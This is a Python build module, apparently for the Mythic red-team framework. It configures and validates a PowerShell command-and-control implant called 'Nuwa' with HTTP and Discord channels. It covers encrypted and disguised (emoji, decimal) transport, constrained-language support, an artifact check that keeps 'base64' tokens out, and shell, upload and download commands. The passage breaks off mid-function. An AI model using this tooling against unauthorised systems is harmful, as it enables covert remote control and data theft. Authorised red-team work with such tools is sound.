from __future__ import annotations

import base64
import binascii
import json
import pathlib
import re
from collections.abc import Mapping, Sequence
from dataclasses import dataclass, field
from datetime import date
from types import SimpleNamespace
from typing import Any
from urllib.parse import urlsplit


try:
    from mythic_container.PayloadBuilder import (
        BuildParameter,
        BuildParameterType,
        BuildResponse,
        BuildStatus,
        BuildStep,
        C2ParameterDeviation,
        PayloadType,
        SupportedOS,
    )
except ImportError:  # pragma: no cover - local unit test fallback
    class SupportedOS:
        Windows = "Windows"

    class BuildParameterType:
        String = "String"
        Number = "Number"
        Boolean = "Boolean"
        Dictionary = "Dictionary"
        ChooseOne = "ChooseOne"

    @dataclass
    class BuildParameter:
        name: str
        parameter_type: str
        description: str = ""
        default_value: Any = None
        required: bool = False
        choices: list[str] | None = None

    class BuildStatus:
        Success = "success"
        Error = "error"

    @dataclass
    class BuildResponse:
        status: str
        payload: bytes = b""
        build_message: str = ""
        build_stderr: str = ""
        build_stdout: str = ""

        def set_status(self, status: str) -> None:
            self.status = status

    @dataclass
    class BuildStep:
        step_name: str
        step_description: str

    class C2ParameterDeviation:
        def __init__(
            self,
            supported: bool,
            choices: list[str] | None = None,
            dictionary_choices: list[Any] | None = None,
            default_value: Any = None,
            **kwargs: Any,
        ) -> None:
            self.Supported = supported
            self.Choices = choices
            self.DictionaryChoices = dictionary_choices
            self.DefaultValue = default_value

    class PayloadType:
        uuid: str = ""
        c2info: list[Any] = []
        commands: Any = None
        selected_os: str = SupportedOS.Windows
        _parameter_values: dict[str, Any]

        def __init__(self, *args, **kwargs):
            self._parameter_values = {}
            self.commands = SimpleNamespace(get_commands=lambda: [])

        def get_parameter(self, name: str) -> Any:
            for parameter in getattr(self, "build_parameters", []):
                if parameter.name == name and name not in self._parameter_values:
                    return parameter.default_value
            return self._parameter_values.get(name)


AGENT_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE_ROOT = AGENT_ROOT / "agent_code"
BASE_CODE_ROOT = AGENT_CODE_ROOT / "base"
CODEC_ROOT = AGENT_CODE_ROOT / "codecs"
CLM_CODEC_ROOT = CODEC_ROOT / "clm"
COMMAND_ROOT = AGENT_CODE_ROOT / "commands"
PROFILE_ROOT = AGENT_CODE_ROOT / "profiles"
FRAMING_ROOT = AGENT_CODE_ROOT / "framing"
DISCORD_PROFILE_ROOT = PROFILE_ROOT / "discordx"
TRANSPORT_ENVELOPE_ROOT = AGENT_CODE_ROOT / "transport_envelope"
TRANSPORT_ENVELOPE_FORMAT_ROOT = TRANSPORT_ENVELOPE_ROOT / "formats"
TRANSPORT_ENVELOPE_FRAMING_ROOT = TRANSPORT_ENVELOPE_ROOT / "framing"
TRANSPORT_ENVELOPE_PRESENTATION_ROOT = TRANSPORT_ENVELOPE_ROOT / "presentations"
TRANSPORT_ENVELOPE_PROTECTION_ROOT = TRANSPORT_ENVELOPE_ROOT / "protections"
TRANSPORT_ENVELOPE_KEY_MODE_ROOT = TRANSPORT_ENVELOPE_ROOT / "key_modes"
TRANSPORT_ENVELOPE_CARRIER_ROOT = TRANSPORT_ENVELOPE_ROOT / "carriers"
PROTECTION_ROOT = AGENT_CODE_ROOT / "protection"
PROTECTION_PROFILE_ROOT = PROTECTION_ROOT / "profiles"
CLM_PROTECTION_ROOT = PROTECTION_ROOT / "clm"
CLM_PROTECTION_PROFILE_ROOT = CLM_PROTECTION_ROOT / "profiles"
STAGING_ROOT = AGENT_CODE_ROOT / "staging"
DEFAULT_COMMANDS = ["sleep", "cd", "whoami", "hostname", "exit", "ls", "shell", "upload", "download"]
POWERSHELL_CODEC_PROFILES = tuple(
    sorted(path.stem for path in CODEC_ROOT.glob("*.ps1") if path.is_file())
)
FORBIDDEN_RAW_ARTIFACT_PATTERN = re.compile(
    rb"(?:base64|(?<![0-9a-f])b64(?![0-9a-f]))",
    re.IGNORECASE,
)
PROTECTION_NONE = "none"
PROTECTION_XOR_V1 = "nuwa_xor_v1"
PROTECTION_HMAC_SHA256_V1 = "nuwa_hmac_sha256_v1"
PROTECTION_AES256_HMAC_V1 = "nuwa_aes256_hmac_v1"
PROTECTED_PROFILES = (
    PROTECTION_XOR_V1,
    PROTECTION_HMAC_SHA256_V1,
    PROTECTION_AES256_HMAC_V1,
)
PROTECTION_CHOICES = (PROTECTION_NONE, *PROTECTED_PROFILES)
LEGACY_UNVERSIONED_PROTECTION = "aes256_hmac"
POWERSHELL_RUNTIME_FULL = "full-language"
POWERSHELL_RUNTIME_CONSTRAINED = "constrained-language"
POWERSHELL_RUNTIME_CHOICES = (
    POWERSHELL_RUNTIME_FULL,
    POWERSHELL_RUNTIME_CONSTRAINED,
)
DISCORD_TRANSPORT_FORMATS = ("json-v1", "binary-v1")
TRANSPORT_PRESENTATIONS = ("plain", "base64", "decimal", "emoji")
HTTP_TRANSPORT_PRESENTATIONS = ("decimal", "emoji")
TRANSPORT_PROTECTIONS = (
    "none",
    "xor-obfuscation-v1",
    "chacha20-v1",
    "aes256-hmac-v1",
)
TRANSPORT_KEY_MODES = ("single", "directional")
HTTP_TRANSPORT_NONCE_STRATEGIES = ("profile-default", "random")


@dataclass(frozen=True)
class SelectedC2Profile:
    name: str
    parameters: dict[str, Any]


@dataclass(frozen=True)
class ProtectionSelection:
    profile: str
    key: bytes | None = field(repr=False)


@dataclass(frozen=True)
class TransportEnvelopeSelection:
    enabled: bool
    envelope_format: str
    presentation: str
    protection: str
    key_mode: str
    nonce_strategy: str | None
    key: bytes | None = field(repr=False)

    @property
    def legacy(self) -> bool:
        return not self.enabled


class InvalidPayloadOptions(ValueError):
    """One or more payload selections cannot produce a valid Nuwa artifact."""

    def __init__(self, errors: Sequence[str]):
        unique_errors = tuple(dict.fromkeys(str(error) for error in errors if str(error)))
        if not unique_errors:
            unique_errors = ("payload option validation failed",)
        self.errors = unique_errors
        super().__init__(
            "Invalid Nuwa payload options:\n- " + "\n- ".join(unique_errors)
        )


@dataclass(frozen=True)
class PayloadOptionSelection:
    c2_profile_name: str
    codec_profile: str
    debug_logging: bool
    require_https: bool
    powershell_runtime: str
    command_names: tuple[str, ...]
    framing_mode: str
    protection: ProtectionSelection
    exchange_enabled: bool
    staging_enabled: bool
    transport_envelope: TransportEnvelopeSelection


def _read_text(path: pathlib.Path) -> str:
    return path.read_text(encoding="utf-8").strip() + "\n"


def _ps_literal(value: Any) -> str:
    if isinstance(value, bool):
        return "$true" if value else "$false"
    if value is None:
        return "$null"
    if isinstance(value, (int, float)):
        return str(value)
    if isinstance(value, (list, tuple)):
        return "@(" + ", ".join(_ps_literal(item) for item in value) + ")"
    text = str(value).replace('"', '`"')
    return f'"{text}"'


def _ps_hashtable(mapping: dict[str, Any], *, indent: str = "    ") -> str:
    lines = ["@{"]
    for key, value in mapping.items():
        if isinstance(value, dict):
            rendered = _ps_hashtable(value, indent=indent + "    ")
            lines.append(f'{indent}"{key}" = {rendered}')
        else:
            lines.append(f'{indent}"{key}" = {_ps_literal(value)}')
    lines.append("}")
    return "\n".join(lines)


def _ps_byte_array(value: bytes) -> str:
    return "[byte[]]@(" + ", ".join(str(item) for item in value) + ")"


def _crypto_field(value: Any, *names: str) -> Any:
    if isinstance(value, dict):
        for name in names:
            if name in value:
                return value[name]
        lowered = {str(key).lower(): item for key, item in value.items()}
        for name in names:
            if name.lower() in lowered:
                return lowered[name.lower()]
        return None

    for name in names:
        if hasattr(value, name):
            return getattr(value, name)
    return None


def _key_material_is_present(value: Any) -> bool:
    return value is not None and value != "" and value != b""


def _decode_crypto_key(value: Any, *, field_name: str) -> bytes:
    if isinstance(value, bytes):
        decoded = value
    elif isinstance(value, str):
        try:
            decoded = base64.b64decode(value, validate=True)
        except (binascii.Error, ValueError) as exc:
            raise ValueError(f"{field_name} key must use strict Base64 encoding") from exc
    else:
        raise ValueError(f"{field_name} key must be a Base64 string or bytes")

    if len(decoded) != 32:
        raise ValueError(f"{field_name} key must decode to exactly one 32-byte key")
    return bytes(decoded)


def _decode_canonical_transport_key(value: Any) -> bytes:
    if not isinstance(value, str):
        raise ValueError("transport_key must use strict Base64 encoding")
    decoded = _decode_crypto_key(value, field_name="transport_key")
    if base64.b64encode(decoded).decode("ascii") != value:
        raise ValueError("transport_key must use canonical strict Base64 encoding")
    return decoded


def _resolve_transport_envelope_selection(
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
) -> TransportEnvelopeSelection:
    """Normalize the fixed listener-owned outer transport selection.

    Absence of all transport parameters preserves pre-feature artifacts. Once
    any parameter is present the complete fixed configuration is validated;
    no value is inferred from channel contents at runtime.
    """
    profile = str(c2_profile_name or "").strip().lower()
    if profile not in {"discordx", "http"}:
        raise ValueError(f"Unsupported Nuwa C2 profile '{profile}'")

    parameter_names = {
        "transport_presentation",
        "transport_envelope_format",
        "transport_protection",
        "transport_key_mode",
        "transport_key",
    }
    if profile == "http":
        parameter_names.add("transport_nonce_strategy")
    configured = any(name in c2_parameters for name in parameter_names)
    legacy_presentation = "legacy-http"
    if not configured:
        if profile == "discordx":
            return TransportEnvelopeSelection(
                enabled=True,
                envelope_format="json-v1",
                presentation="plain",
                protection="none",
                key_mode="single",
                nonce_strategy=None,
                key=None,
            )
        return TransportEnvelopeSelection(
            enabled=False,
            envelope_format="legacy-http",
            presentation=legacy_presentation,
            protection="none",
            key_mode="single",
            nonce_strategy="profile-default" if profile == "http" else None,
            key=None,
        )

    envelope_format = (
        str(c2_parameters.get("transport_envelope_format", "json-v1")).strip().lower()
        if profile == "discordx"
        else "json-v1"
    )
    presentation = str(c2_parameters.get(
        "transport_presentation", "plain" if profile == "discordx" else legacy_presentation
    )).strip().lower()
    protection = str(c2_parameters.get("transport_protection", "none")).strip().lower()
    key_mode = str(c2_parameters.get("transport_key_mode", "single")).strip().lower()
    nonce_strategy = None
    if profile == "http":
        nonce_strategy = str(
            c2_parameters.get("transport_nonce_strategy", "profile-default")
        ).strip().lower()
    # Discord's selected protection version owns its nonce or IV construction.
    # Ignore stale saved values from installations that exposed this retired knob.
    key_value = c2_parameters.get("transport_key", "")

    available_presentations = (
        TRANSPORT_PRESENTATIONS
        if profile == "discordx"
        else HTTP_TRANSPORT_PRESENTATIONS
    )
    allowed_presentations = set(available_presentations)
    if profile == "http":
        allowed_presentations.add(legacy_presentation)
    if profile == "discordx" and envelope_format not in DISCORD_TRANSPORT_FORMATS:
        raise ValueError(
            f"transport_envelope_format must be one of {list(DISCORD_TRANSPORT_FORMATS)}"
        )
    if presentation not in allowed_presentations:
        raise ValueError(
            f"transport_presentation must be one of {sorted(allowed_presentations)}"
        )
    if protection not in TRANSPORT_PROTECTIONS:
        raise ValueError(
            f"transport_protection must be one of {list(TRANSPORT_PROTECTIONS)}"
        )
    if key_mode not in TRANSPORT_KEY_MODES:
        raise ValueError("transport_key_mode must be 'single' or 'directional'")
    if profile == "http" and nonce_strategy not in HTTP_TRANSPORT_NONCE_STRATEGIES:
        raise ValueError(
            "transport_nonce_strategy must be 'profile-default' or 'random'"
        )

    is_legacy = profile == "http" and presentation == legacy_presentation
    if is_legacy and protection != "none":
        raise ValueError("legacy transport presentation is valid only with none protection")
    if not is_legacy and presentation not in available_presentations:
        raise ValueError(
            f"protected {profile} transport requires one of "
            f"{list(available_presentations)}"
        )
    if profile == "discordx" and presentation == "plain" and (
        envelope_format != "json-v1" or protection != "none"
    ):
        raise ValueError(
            "plain transport_presentation requires json-v1 transport_envelope_format "
            "and none transport_protection"
        )

    if protection == "none":
        # Mythic can materialize a randomized listener key even when the
        # selected conditional protection is none. It is deliberately
        # discarded and never enters the generated artifact.
        key = None
    else:
        if is_legacy:
            raise ValueError("legacy transport presentation cannot use protection")
        if not _key_material_is_present(key_value):
            raise ValueError(f"{protection} requires a canonical 32-byte transport_key")
        key = _decode_canonical_transport_key(key_value)

    return TransportEnvelopeSelection(
        enabled=not is_legacy,
        envelope_format=envelope_format,
        presentation=presentation,
        protection=protection,
        key_mode=key_mode,
        nonce_strategy=nonce_strategy,
        key=key,
    )


def _resolve_protection_selection(value: Any) -> ProtectionSelection:
    if value is None or value == "":
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if isinstance(value, str):
        profile = value.strip().lower()
        enc_key = None
        dec_key = None
    else:
        profile = str(_crypto_field(value, "value", "Value") or PROTECTION_NONE)
        profile = profile.strip().lower()
        enc_key = _crypto_field(value, "enc_key", "EncKey")
        dec_key = _crypto_field(value, "dec_key", "DecKey")

    has_enc_key = _key_material_is_present(enc_key)
    has_dec_key = _key_material_is_present(dec_key)
    if profile in {PROTECTION_NONE, ""}:
        if has_enc_key or has_dec_key:
            raise ValueError("none protection must not carry key material")
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if profile == LEGACY_UNVERSIONED_PROTECTION:
        if has_enc_key or has_dec_key:
            raise ValueError(
                "unversioned aes256_hmac key material is not valid for a Nuwa build"
            )
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if profile not in PROTECTED_PROFILES:
        raise ValueError(f"unsupported Nuwa protection profile '{profile}'")
    if not has_enc_key or not has_dec_key:
        raise ValueError(f"{profile} requires matching 32-byte encryption and decryption keys")

    decoded_enc_key = _decode_crypto_key(enc_key, field_name="encryption")
    decoded_dec_key = _decode_crypto_key(dec_key, field_name="decryption")
    if decoded_enc_key != decoded_dec_key:
        raise ValueError("Nuwa protection encryption and decryption keys must match")
    return ProtectionSelection(profile=profile, key=decoded_enc_key)


def _coerce_powershell_runtime(value: Any) -> str:
    """Return the canonical build-time PowerShell implementation selection."""
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized in POWERSHELL_RUNTIME_CHOICES:
            return normalized
    raise ValueError(
        "powershell_runtime must be 'full-language' or 'constrained-language'"
    )


def _protection_source_paths(
    protection_profile: str,
    powershell_runtime: str,
) -> tuple[pathlib.Path, ...]:
    """Return only the ordered PowerShell source fragments for one backend."""
    runtime = _coerce_powershell_runtime(powershell_runtime)
    if protection_profile not in PROTECTED_PROFILES:
        raise ValueError(f"Unsupported protected profile '{protection_profile}'")

    if runtime == POWERSHELL_RUNTIME_FULL:
        paths = (PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1",)
    else:
        paths_list = [CLM_PROTECTION_ROOT / "common.ps1"]
        if protection_profile in {
            PROTECTION_HMAC_SHA256_V1,
            PROTECTION_AES256_HMAC_V1,
        }:
            paths_list.append(CLM_PROTECTION_ROOT / "sha256.ps1")
        if protection_profile == PROTECTION_AES256_HMAC_V1:
            paths_list.append(CLM_PROTECTION_ROOT / "aes256.ps1")
        paths_list.append(CLM_PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1")
        paths = tuple(paths_list)

    for path in paths:
        if not path.is_file():
            raise ValueError(f"Missing PowerShell protection source '{path.name}'")
    return paths


def _staging_source_path(powershell_runtime: str) -> pathlib.Path:
    """Return the one statically selected RSA staging implementation."""
    runtime = _coerce_powershell_runtime(powershell_runtime)
    path = (
        STAGING_ROOT / "rsa.ps1"
        if runtime == POWERSHELL_RUNTIME_FULL
        else STAGING_ROOT / "clm" / "rsa.ps1"
    )
    if not path.is_file():
        raise ValueError(f"Missing PowerShell staging source '{path.name}'")
    return path


def _coerce_require_https(value: Any) -> bool:
    if value is None:
        return False
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized == "true":
            return True
        if normalized == "false":
            return False
    raise ValueError("require_https must be a Boolean true or false value")


def _coerce_encrypted_exchange(c2_profile_name: str, value: Any) -> bool:
    if value is None or value == "":
        return False
    if c2_profile_name == "http":
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            normalized = value.strip().lower()
            if normalized == "true":
                return True
            if normalized == "false":
                return False
        raise ValueError("HTTP encrypted_exchange_check must be Boolean true or false")
    if c2_profile_name == "discordx":
        if isinstance(value, str):
            normalized = value.strip().upper()
            if normalized == "T":
                return True
            if normalized == "F":
                return False
        raise ValueError("Discord encrypted_exchange_check must be 'T' or 'F'")
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _validate_https_policy(
    *,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    require_https: bool,
) -> None:
    if not require_https or c2_profile_name == "discordx":
        return
    if c2_profile_name != "http":
        raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")

    callback_host = str(c2_parameters.get("callback_host", "")).strip()
    parsed = urlsplit(callback_host)
    if parsed.scheme.lower() != "https" or not parsed.hostname:
        raise ValueError("require_https requires an HTTP callback_host using HTTPS")


def _coerce_debug_logging(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    raise ValueError("debug_logging must be a Boolean true or false value")


def _coerce_choice(name: str, value: Any, choices: Sequence[str]) -> str:
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized in choices:
            return normalized
    raise ValueError(f"{name} must be one of {list(choices)}")


def _integer_parameter_error(
    parameters: Mapping[str, Any],
    name: str,
    *,
    default: int,
    minimum: int,
    maximum: int | None = None,
) -> str | None:
    value = parameters.get(name, default)
    if isinstance(value, bool):
        return f"{name} must be a whole number"
    try:
        number = int(value)
    except (TypeError, ValueError, OverflowError):
        return f"{name} must be a whole number"
    if isinstance(value, float) and not value.is_integer():
        return f"{name} must be a whole number"
    if isinstance(value, str) and not value.strip().isdigit():
        return f"{name} must be a whole number"
    if number < minimum or (maximum is not None and number > maximum):
        boundary = f"between {minimum} and {maximum}" if maximum is not None else f"at least {minimum}"
        return f"{name} must be {boundary}"
    return None


def _is_origin_without_embedded_port(value: Any, *, allow_trailing_slash: bool) -> bool:
    try:
        parsed = urlsplit(str(value).strip())
        path_choices = {"", "/"} if allow_trailing_slash else {""}
        return (
            parsed.scheme.lower() in {"http", "https"}
            and parsed.hostname is not None
            and parsed.port is None
            and parsed.username is None
            and parsed.password is None
            and parsed.path in path_choices
            and not parsed.query
            and not parsed.fragment
        )
    except (TypeError, ValueError):
        return False


def _profile_parameter_errors(
    c2_profile_name: str,
    c2_parameters: Mapping[str, Any],
) -> list[str]:
    """Validate values that Nuwa embeds and later consumes as runtime settings."""
    errors: list[str] = []
    for name, default, minimum, maximum in (
        ("callback_interval", 3, 0, None),
        ("callback_jitter", 30, 0, 100),
    ):
        error = _integer_parameter_error(
            c2_parameters,
            name,
            default=default,
            minimum=minimum,
            maximum=maximum,
        )
        if error:
            errors.append(error)

    killdate = c2_parameters.get("killdate", "")
    if killdate not in (None, ""):
        try:
            if not isinstance(killdate, date):
                date.fromisoformat(str(killdate))
        except (TypeError, ValueError):
            errors.append("killdate must be a valid YYYY-MM-DD date")

    proxy_host = str(c2_parameters.get("proxy_host", "") or "").strip()
    proxy_port = c2_parameters.get("proxy_port", "")
    proxy_user_present = bool(str(c2_parameters.get("proxy_user", "") or "").strip())
    proxy_pass_present = bool(str(c2_parameters.get("proxy_pass", "") or "").strip())
    proxy_port_present = proxy_port not in (None, "")
    if proxy_host:
        if not _is_origin_without_embedded_port(
            proxy_host,
            allow_trailing_slash=False,
        ):
            errors.append(
                "proxy_host must be an HTTP or HTTPS origin without credentials, path, query, or port"
            )
        if not proxy_port_present:
            errors.append("proxy_port is required when proxy_host is set")
    elif proxy_port_present or proxy_user_present or proxy_pass_present:
        errors.append("proxy_host is required when proxy settings are supplied")
    if proxy_port_present:
        error = _integer_parameter_error(
            c2_parameters,
            "proxy_port",
            default=0,
            minimum=1,
            maximum=65535,
        )
        if error:
            errors.append(error)

    if c2_profile_name == "http":
        callback_host = c2_parameters.get("callback_host", "")
        if not _is_origin_without_embedded_port(
            callback_host,
            allow_trailing_slash=True,
        ):
            errors.append(
                "callback_host must be an HTTP or HTTPS origin without credentials, path, query, or port"
            )
        error = _integer_parameter_error(
            c2_parameters,
            "callback_port",
            default=80,
            minimum=1,
            maximum=65535,
        )
        if error:
            errors.append(error)
        headers = c2_parameters.get("headers", {})
        if not isinstance(headers, Mapping):
            errors.append("headers must be a dictionary")
    elif c2_profile_name == "discordx":
        if not str(c2_parameters.get("discord_token", "") or "").strip():
            errors.append("discord_token is required")
        channel = str(c2_parameters.get("bot_channel", "") or "").strip()
        if not channel:
            errors.append("bot_channel is required")
        elif not channel.isdigit():
            errors.append("bot_channel must be a numeric Discord channel ID")
        for name, default, minimum in (
            ("message_checks", 10, 1),
            ("time_between_checks", 10, 0),
        ):
            error = _integer_parameter_error(
                c2_parameters,
                name,
                default=default,
                minimum=minimum,
            )
            if error:
                errors.append(error)
    return errors


def _resolve_command_names(command_names: Any) -> tuple[tuple[str, ...], list[str]]:
    if command_names is None:
        return tuple(DEFAULT_COMMANDS), []
    if isinstance(command_names, (str, bytes)) or not isinstance(command_names, Sequence):
        return (), ["command selection must be a list of command names"]
    raw_names = command_names or DEFAULT_COMMANDS
    requested_list: list[Any] = []
    for name in raw_names:
        if name not in requested_list:
            requested_list.append(name)
    requested = tuple(requested_list)
    errors: list[str] = []
    for command_name in requested:
        if not isinstance(command_name, str) or not command_name.strip():
            errors.append("command selection contains an invalid command name")
            continue
        if not (COMMAND_ROOT / f"{command_name}.ps1").is_file():
            errors.append(f"command '{command_name}' is not supported by Nuwa")
    return tuple(str(name) for name in requested), errors


def _payload_compatibility_errors(
    *,
    c2_profile_name: str,
    c2_parameters: Mapping[str, Any],
    framing_mode: str,
    codec_profile: str,
    protection_profile: str,
    exchange_enabled: bool,
    transport_envelope: TransportEnvelopeSelection,
) -> list[str]:
    errors: list[str] = []
    if c2_profile_name == "discordx":
        wire_protocol = str(c2_parameters.get("wire_protocol", "fixed") or "").strip().lower()
        if wire_protocol != "fixed":
            errors.append(
                "wire_protocol must be 'fixed' for Nuwa payloads; the legacy DiscordX "
                "listener does not implement Nuwa's fixed transport envelope"
            )
    if exchange_enabled and protection_profile != PROTECTION_AES256_HMAC_V1:
        errors.append(
            "encrypted_exchange_check can be enabled only with the "
            "nuwa_aes256_hmac_v1 protection profile and one matching 32-byte key"
        )
    if protection_profile != PROTECTION_NONE and codec_profile == "raw":
        if c2_profile_name == "http":
            errors.append(
                "Raw codec_profile cannot carry binary inner-protection output over HTTP; "
                "select base64, decimal, or emoji"
            )
        elif transport_envelope.envelope_format == "json-v1" and framing_mode == "raw":
            errors.append(
                "json-v1 transport_envelope_format cannot carry protected raw codec bytes "
                "with use_base64=false; select binary-v1, historical Base64 framing, "
                "or a text-producing codec_profile"
            )
    return errors


def _validate_payload_compatibility(**kwargs: Any) -> None:
    errors = _payload_compatibility_errors(**kwargs)
    if errors:
        raise InvalidPayloadOptions(errors)


def _resolve_payload_options(
    *,
    c2_profile_name: Any,
    c2_parameters: Any,
    codec_profile: Any,
    debug_logging: Any,
    require_https: Any,
    powershell_runtime: Any,
    command_names: Any,
) -> PayloadOptionSelection:
    """Normalize and exhaustively validate one submitted Nuwa payload configuration."""
    errors: list[str] = []

    def capture(function: Any) -> Any:
        try:
            return function()
        except (TypeError, ValueError) as exc:
            errors.append(str(exc))
            return None

    profile_name = capture(
        lambda: _coerce_choice(
            "c2_profile",
            c2_profile_name,
            ("http", "discordx"),
        )
    )
    parameters: Mapping[str, Any]
    if isinstance(c2_parameters, Mapping):
        parameters = c2_parameters
    else:
        errors.append("C2 parameters must be a dictionary")
        parameters = {}

    codec = capture(
        lambda: _coerce_choice("codec_profile", codec_profile, POWERSHELL_CODEC_PROFILES)
    )
    debug = capture(lambda: _coerce_debug_logging(debug_logging))
    https_required = capture(lambda: _coerce_require_https(require_https))
    runtime = capture(lambda: _coerce_powershell_runtime(powershell_runtime))
    commands, command_errors = _resolve_command_names(command_names)
    errors.extend(command_errors)

    protection = capture(
        lambda: _resolve_protection_selection(parameters.get("AESPSK"))
    )
    framing = (
        capture(lambda: _resolve_framing_mode(profile_name, dict(parameters)))
        if profile_name is not None
        else None
    )
    exchange = (
        capture(
            lambda: _coerce_encrypted_exchange(
                profile_name,
                parameters.get("encrypted_exchange_check"),
            )
        )
        if profile_name is not None
        else None
    )
    transport = (
        capture(
            lambda: _resolve_transport_envelope_selection(
                profile_name,
                dict(parameters),
            )
        )
        if profile_name is not None
        else None
    )

    if profile_name is not None:
        errors.extend(_profile_parameter_errors(profile_name, parameters))
        if https_required is not None:
            capture(
                lambda: _validate_https_policy(
                    c2_profile_name=profile_name,
                    c2_parameters=dict(parameters),
                    require_https=https_required,
                )
            )
        if framing == "raw":
            capture(lambda: _validate_raw_parameters(profile_name, dict(parameters)))

    if (
        protection is not None
        and exchange is not None
        and exchange
        and protection.profile != PROTECTION_AES256_HMAC_V1
    ):
        errors.append(
            "encrypted_exchange_check can be enabled only with the "
            "nuwa_aes256_hmac_v1 protection profile and one matching 32-byte key"
        )

    if all(
        item is not None
        for item in (profile_name, codec, protection, framing, exchange, transport)
    ):
        errors.extend(
            _payload_compatibility_errors(
                c2_profile_name=profile_name,
                c2_parameters=parameters,
                framing_mode=framing,
                codec_profile=codec,
                protection_profile=protection.profile,
                exchange_enabled=exchange,
                transport_envelope=transport,
            )
        )

    if errors:
        raise InvalidPayloadOptions(errors)

    if debug is None or https_required is None or runtime is None:
        raise InvalidPayloadOptions(("payload option normalization failed",))
    return PayloadOptionSelection(
        c2_profile_name=profile_name,
        codec_profile=codec,
        debug_logging=debug,
        require_https=https_required,
        powershell_runtime=runtime,
        command_names=commands,
        framing_mode=framing,
        protection=protection,
        exchange_enabled=exchange,
        staging_enabled=exchange and protection.profile == PROTECTION_AES256_HMAC_V1,
        transport_envelope=transport,
    )


def _replace_source_once(source: str, old: str, new: str, *, label: str) -> str:
    count = source.count(old)
    if count != 1:
        raise ValueError(
            f"Protected agent source expected one {label} marker but found {count}"
        )
    return source.replace(old, new, 1)


def _replace_marked_source_region(
    source: str,
    *,
    begin_marker: str,
    end_marker: str,
    replacement: str,
    label: str,
) -> str:
    if source.count(begin_marker) != 1 or source.count(end_marker) != 1:
        raise ValueError(f"Agent source expected one {label} region")
    start = source.index(begin_marker)
    end = source.index(end_marker, start) + len(end_marker)
    return source[:start] + replacement.rstrip() + "\n" + source[end:]


def _render_protected_agent_main_source() -> str:
    source = _read_text(BASE_CODE_ROOT / "agent_main.ps1")
    source = _replace_source_once(
        source,
        "$response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action 'checkin'",
        "$response = Invoke-NuwaSendMessage -Uuid $script:NuwaCryptoState.OuterUuid -Action 'checkin'",
        label="check-in transport UUID",
    )
    return source


def _render_discord_byte_agent_main_source(source: str) -> str:
    source = _replace_source_once(
        source,
        "    $wireBody = ConvertFrom-NuwaUtf8Bytes -Bytes (\n"
        "        ConvertTo-NuwaWireBytes -MessageJson $json -Context (Get-NuwaCodecContext -Direction 'outbound' -Uuid $Uuid -MessageType $Action)\n"
        "    )",
        "    [byte[]]$wireBody = ConvertTo-NuwaWireBytes -MessageJson $json -Context "
        "(Get-NuwaCodecContext -Direction 'outbound' -Uuid $Uuid -MessageType $Action)",
        label="Discord byte-oriented wire body",
    )
    return _replace_source_once(
        source,
        "    if ([string]::IsNullOrWhiteSpace($rawResponse)) {",
        "    if ($null -eq $rawResponse -or ([byte[]]$rawResponse).Length -eq 0) {",
        label="Discord byte-oriented empty response check",
    )


def _render_staged_agent_runtime_source() -> str:
    source = _render_protected_agent_main_source()
    source = _replace_source_once(
        source,
        "            $script:NuwaState.CallbackUUID = [string]$response.id\n",
        "\n".join(
            [
                "            $callbackUuid = [string]$response.id",
                "            $script:NuwaCryptoState = @{",
                "                OuterUuid = $callbackUuid",
                "                Key = [byte[]]$script:NuwaCryptoState.Key",
                "            }",
                "            $script:NuwaState.CallbackUUID = $callbackUuid",
                "",
            ]
        ),
        label="staged callback crypto-state transition",
    )
    return _replace_source_once(
        source,
        "\nStart-Nuwa\n",
        "\n",
        label="protected auto-start",
    )


def _resolve_selected_c2_profile(c2info: list[Any]) -> SelectedC2Profile:
    if len(c2info) != 1:
        raise ValueError("Nuwa build requires exactly one C2 profile")

    c2 = c2info[0]
    profile = c2.get_c2profile()
    profile_name = str(profile.get("name", "")).strip().lower()
    if profile_name not in {"http", "discordx"}:
        raise ValueError(f"Unsupported Nuwa C2 profile '{profile_name}'")

    return SelectedC2Profile(
        name=profile_name,
        parameters=dict(c2.get_parameters_dict()),
    )


def _coerce_use_base64(value: Any) -> bool:
    if value is None:
        return True
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized == "true":
            return True
        if normalized == "false":
            return False
    raise ValueError("use_base64 must be a Boolean true or false value")


def _resolve_framing_mode(
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
) -> str:
    if c2_profile_name in {"http", "discordx"}:
        return "legacy" if _coerce_use_base64(c2_parameters.get("use_base64")) else "raw"
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _validate_raw_parameters(c2_profile_name: str, c2_parameters: dict[str, Any]) -> None:
    if any(
        str(c2_parameters.get(name, "")).strip()
        for name in ("proxy_user", "proxy_pass")
    ):
        raise ValueError(
            f"Raw {c2_profile_name.upper()} credentialed proxies require legacy mode"
        )

    if c2_profile_name != "http":
        return

    headers = dict(c2_parameters.get("headers", {}))
    for name, value in headers.items():
        if str(name).lower() != "x-mythic-body-format":
            continue
        if str(value).strip().lower() != "raw-v1":
            raise ValueError(
                "X-Mythic-Body-Format conflicts with the required raw-v1 selector"
            )


def _validate_raw_artifact(payload: bytes) -> None:
    if FORBIDDEN_RAW_ARTIFACT_PATTERN.search(payload) is not None:
        raise ValueError("Raw artifact violates the forbidden-token invariant")


def _validate_staged_raw_artifact(
    payload: bytes,
    staging_module: bytes,
    *,
    allow_base64_tokens: bool = False,
) -> None:
    if payload.count(staging_module) != 1:
        raise ValueError("Staged raw artifact must contain exactly one staging module")
    without_staging_module = payload.replace(staging_module, b"", 1)
    if not allow_base64_tokens:
        _validate_raw_artifact(without_staging_module)
    for legacy_marker in (
